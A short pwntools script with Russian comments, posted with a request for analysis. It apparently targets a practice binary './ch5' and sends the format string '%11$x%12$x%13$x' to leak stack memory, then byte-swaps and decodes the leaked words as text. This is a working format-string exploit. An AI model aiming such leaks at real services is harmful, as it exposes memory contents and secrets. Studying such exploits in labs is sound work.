# Скипит не мой, нужен анализ
#!/usr/bin/env python3
from pwn import process, remote
import re

# --- Настройки: локально запускаем ./ch5, для удалённого хоста используем remote(...)
p = process('./ch5')
# p = remote('example.com', 1337)  # если нужно подключиться по сети

# Форматная строка, как в твоём примере
fmt = '%11$x%12$x%13$x'
p.sendline(fmt)

# Получаем ответ (строку, содержащую hex-значения)
resp = p.recvline(timeout=2).decode('latin-1').strip()
p.close()

# Извлечём все hex-последовательности (например: '41424344', или 'deadbeef')
hex_chunks = re.findall(r'[0-9a-fA-F]+', resp)
if not hex_chunks:
    raise SystemExit(f"No hex found in response: {resp!r}")

# Нормализуем: каждый найденный кусок считаем 32-бит словом и дополняем ведущими нулями до 8 символов
normalized = [h.zfill(8) for h in hex_chunks]

# Для каждого 8-символьного слова делаем перестановку байтов (двухсимвольных групп) в обратном порядке
swapped = []
for word in normalized:
    # разбиваем на байты и разворачиваем порядок байт (little<->big swap)
    bytes_pairs = [word[i:i+2] for i in range(0, 8, 2)]
    swapped_word = ''.join(bytes_pairs[::-1])
    swapped.append(swapped_word)

# Собираем все байты вместе
raw = b''.join(bytes.fromhex(w) for w in swapped)

# Показываем результат: как сырые байты и как строку (если это текст)
print("orig resp:", resp)
print("hex chunks:", hex_chunks)
print("normalized:", normalized)
print("swapped:", swapped)
print("raw bytes:", raw)
try:
    print("as text:", raw.decode('utf-8', errors='replace'))
except Exception:
    pass
